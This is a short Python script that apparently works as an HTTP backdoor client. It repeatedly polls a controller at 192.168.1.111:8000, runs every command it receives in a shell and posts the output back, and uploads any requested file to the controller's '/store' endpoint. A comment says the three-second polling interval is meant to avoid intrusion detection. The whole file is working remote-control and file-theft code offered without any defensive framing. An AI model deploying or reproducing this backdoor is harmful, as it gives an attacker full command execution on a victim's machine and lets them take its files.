#!/usr/bin/python

import requests
import subprocess # shell management
import time
import os

while True:
    req = requests.get('http://192.168.1.111:8000')
    command = req.text # request body

    if 'terminate' in command:
        break # this will break the loop
    elif 'grab' in command:
        grab,path = command.split(' -f ') # splitting the flag for the file
        if os.path.exists(path):
            url = 'http://192.168.1.111:8000/store' # POST url to send file
            files = {'file': open(path, 'rb')}
            r = requests.post(url, files=files)
        else:
            post_response = requests.post(url='http://192.168.1.111:8000', data='[-] Not able to find the file')
    else:
        CMD = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        post_response = requests.post(url="http://192.168.1.111:8000", data=CMD.stdout.read())
        post_response = requests.post(url="http://192.168.1.111:8000", data=CMD.stderr.read())

    # 3 seg cycle - avoiding IDS
    time.sleep(3)
